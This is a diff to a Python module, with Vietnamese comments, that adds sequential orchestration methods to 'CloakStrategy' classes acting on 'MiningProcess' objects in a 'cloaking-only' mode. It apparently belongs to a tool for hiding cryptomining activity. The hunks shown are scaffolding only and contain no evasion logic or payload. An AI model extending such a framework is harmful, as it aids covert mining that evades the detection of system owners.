@@ -58,7 +58,7 @@ class StrategyType:
     DISK_IO = "disk_io"
     CACHE = "cache"
     MEMORY = "memory"
-    THERMAL_CONTROL = "thermal_control"  # ⚠️ DEPRECATED: Unified vào GPU strategy
+    # THERMAL_CONTROL removed - unified into GPU strategy for better coordination
 
 ###############################################################################
 #                           CƠ SỞ CỦA CÁC STRATEGY                            #
@@ -85,6 +85,11 @@ class CloakStrategy(ABC):
     supports_concurrent_application: bool = True  # Có thể apply cùng lúc với strategies khác
     estimated_application_time_ms: int = 100  # Estimated time to apply strategy
     compatibility_matrix: Dict[str, str] = {}  # Compatibility với other strategies
+    
+    # ✅ LINEAR FLOW: Sequential orchestration attributes
+    linear_flow_enabled: bool = True  # Supports linear flow orchestration
+    sequential_application_delay_ms: int = 50  # Delay between sequential applications
+    handoff_metadata: Optional[Dict[str, Any]] = None  # Metadata từ linear handoff chain
 
     def set_privileged_manager(self, privileged_manager: Any) -> None:
         """
@@ -114,6 +119,140 @@ class CloakStrategy(ABC):
         """
         self.logger.info(f"[RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
         pass
+    
+    def set_linear_handoff_metadata(self, metadata: Dict[str, Any]) -> None:
+        """
+        **Set Linear Handoff Metadata** (đặt metadata chuyển giao tuyến tính)
+        
+        Receives metadata từ linear flow chain để inform strategy application.
+        
+        Args:
+            metadata: Handoff metadata từ previous components trong chain
+        """
+        self.handoff_metadata = metadata
+        if hasattr(self, 'logger'):
+            self.logger.debug(f"Linear handoff metadata set for {self.__class__.__name__}")
+    
+    def apply_with_linear_flow(self, process: MiningProcess, orchestration_context: Dict[str, Any]) -> bool:
+        """
+        **Apply With Linear Flow** (áp dụng với luồng tuyến tính)
+        
+        Enhanced apply method with linear flow orchestration context.
+        Provides better coordination and sequencing trong strategy chain.
+        
+        Args:
+            process: MiningProcess object
+            orchestration_context: Context từ linear flow orchestrator
+            
+        Returns:
+            bool: True nếu strategy application successful
+        """
+        try:
+            if hasattr(self, 'logger'):
+                self.logger.info(f"🔄 [LINEAR-APPLY] Applying {self.__class__.__name__} with linear flow context")
+                self.logger.debug(f"🔍 [LINEAR-APPLY] Orchestration context: {orchestration_context}")
+            
+            # **Set handoff metadata từ orchestration context** (đặt metadata handoff từ ngữ cảnh điều phối)
+            if 'handoff_metadata' in orchestration_context:
+                self.set_linear_handoff_metadata(orchestration_context['handoff_metadata'])
+            
+            # **Sequential application delay** (độ trễ áp dụng tuần tự) for coordination
+            if self.sequential_application_delay_ms > 0:
+                delay_seconds = self.sequential_application_delay_ms / 1000.0
+                if hasattr(self, 'logger'):
+                    self.logger.debug(f"⏳ [LINEAR-APPLY] Sequential delay: {delay_seconds}s")
+                time.sleep(delay_seconds)
+            
+            # **Enhanced pre-apply check** (kiểm tra trước áp dụng nâng cao) with orchestration context
+            if not self.pre_apply_check_with_context(process, orchestration_context):
+                if hasattr(self, 'logger'):
+                    self.logger.warning(f"⚠️ [LINEAR-APPLY] Pre-apply check failed for {self.__class__.__name__}")
+                return False
+            
+            # **Apply strategy using standard method** (áp dụng chiến lược sử dụng phương thức tiêu chuẩn)
+            application_success = self.apply(process)
+            
+            # **Enhanced post-apply verification** (xác minh sau áp dụng nâng cao) with orchestration context
+            if application_success:
+                verification_success = self.post_apply_verification_with_context(process, orchestration_context)
+                if not verification_success:
+                    if hasattr(self, 'logger'):
+                        self.logger.warning(f"⚠️ [LINEAR-APPLY] Post-apply verification failed for {self.__class__.__name__}")
+                    return False
+            
+            if hasattr(self, 'logger'):
+                result_msg = "✅ Success" if application_success else "❌ Failed"
+                self.logger.info(f"{result_msg} [LINEAR-APPLY] {self.__class__.__name__} linear flow application")
+            
+            return application_success
+            
+        except Exception as e:
+            if hasattr(self, 'logger'):
+                self.logger.error(f"❌ [LINEAR-APPLY] Exception in {self.__class__.__name__} linear flow application: {e}")
+            return False
+    
+    def pre_apply_check_with_context(self, process: MiningProcess, orchestration_context: Dict[str, Any]) -> bool:
+        """
+        **Enhanced Pre-Apply Check** (kiểm tra trước áp dụng nâng cao)
+        
+        Pre-application check với orchestration context for better coordination.
+        
+        Args:
+            process: MiningProcess object
+            orchestration_context: Orchestration context
+            
+        Returns:
+            bool: True nếu strategy có thể áp dụng an toàn
+        """
+        try:
+            # **Standard pre-apply check** (kiểm tra trước áp dụng tiêu chuẩn)
+            base_check = self.pre_apply_check(process)
+            if not base_check:
+                return False
+            
+            # **Enhanced checks with orchestration context** (kiểm tra nâng cao với ngữ cảnh điều phối)
+            # Check if previous strategies in chain were successful
+            if 'previous_results' in orchestration_context:
+                previous_results = orchestration_context['previous_results']
+                if not all(previous_results.values()):
+                    if hasattr(self, 'logger'):
+                        self.logger.warning(f"⚠️ [PRE-CHECK] Previous strategies failed, may affect {self.__class__.__name__}")
+            
+            return True
+            
+        except Exception as e:
+            if hasattr(self, 'logger'):
+                self.logger.debug(f"Enhanced pre-apply check failed for {self.__class__.__name__}: {e}")
+            return False
+    
+    def post_apply_verification_with_context(self, process: MiningProcess, orchestration_context: Dict[str, Any]) -> bool:
+        """
+        **Enhanced Post-Apply Verification** (xác minh sau áp dụng nâng cao)
+        
+        Post-application verification với orchestration context for better validation.
+        
+        Args:
+            process: MiningProcess object
+            orchestration_context: Orchestration context
+            
+        Returns:
+            bool: True nếu strategy verification successful
+        """
+        try:
+            # **Standard post-apply verification** (xác minh sau áp dụng tiêu chuẩn)
+            base_verification = self.post_apply_verification(process)
+            if not base_verification:
+                return False
+            
+            # **Enhanced verification with orchestration context** (xác minh nâng cao với ngữ cảnh điều phối)
+            # Add orchestration-specific verification logic here
+            
+            return True
+            
+        except Exception as e:
+            if hasattr(self, 'logger'):
+                self.logger.debug(f"Enhanced post-apply verification failed for {self.__class__.__name__}: {e}")
+            return False
 
     # ✅ NEW: Comprehensive cloaking support methods
     def pre_apply_check(self, process: MiningProcess) -> bool:
@@ -1102,16 +1241,7 @@ class MemoryCloakStrategy(CloakStrategy):
         """
         self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
-###############################################################################
-#                    DEPRECATED: CloakStrategyFactory REMOVED                 #
-###############################################################################
-
-# CloakStrategyFactory đã được thay thế bởi ResourceCoordinator trong resource_control.py
-# theo blueprint redesign. Tất cả strategy management đã được tập trung hóa trong
-# ResourceCoordinator với khả năng phân biệt direct execution và plugin delegation.
-#
-# Để tương thích ngược, sử dụng:
-# from .resource_control import CloakStrategyFactory
+# Note: CloakStrategyFactory implementation moved to resource_control.py
 
 ###############################################################################
 #                         ✅ ERROR RECOVERY SYSTEM                         #
@@ -1140,7 +1270,7 @@ def _register_strategy_recovery_handlers() -> None:
                 # Nếu process thật sự không tồn tại, cleanup related resources
                 cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                 
-                # TODO: Add cleanup logic here based on strategy type
+                # Strategy-specific cleanup handled by individual strategy classes
                 # For now, just log successful cleanup
                 return True
                 
